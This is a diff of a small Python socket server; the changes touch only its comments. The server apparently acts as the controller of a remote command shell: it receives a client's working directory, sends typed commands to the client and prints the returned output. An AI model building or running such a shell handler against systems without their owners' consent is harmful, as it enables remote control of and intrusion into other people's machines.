@@ -3,10 +3,10 @@ import sys
 import select
 from _thread import *
 
-HOST = sys.argv[1]  # all available interfaces
-PORT = int(sys.argv[2]) # non-privileged port
+HOST = sys.argv[1]  # has not error checking at the moment
+PORT = int(sys.argv[2]) # also has no error checking
 buff = 1024 * 128
-sep = "<sep>"
+sep = "<sep>" #separator to allow two strings at once to be sent.
 #Creats a socket object
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print( 'Socket created')
@@ -30,19 +30,19 @@ print ('Socket now listening')
 def cthread(c):
 			sockets_list = [sys.stdin, c] #Lists inputs come from stdin to c socket object
 			read_sockets,write_socket, error_socket = select.select(sockets_list,[],[]) #unix specific using select system call. waiting to read from socket.
-			wd = c.recv(buff).decode()
+			wd = c.recv(buff).decode() #get current working directory from client.
 			print("[+] Current working directory:", wd)
 			while True:
 					data = input(f"{wd} $> ")
 					if not data.strip():
-					# empty command
+					# if empty data cmd keep going
 						continue
 					# send the command to the client  
 					c.send(data.encode())
 					if data.lower() == "exit":
-					# if the command is exit, just break out of the loop
+					# if the cmd data equals exit, break loop
 						break
-					# retrieve command results
+					# get data cmd results
 					output = c.recv(buff).decode()
 					# split command output and current directory
 					results, wd = output.split(sep)
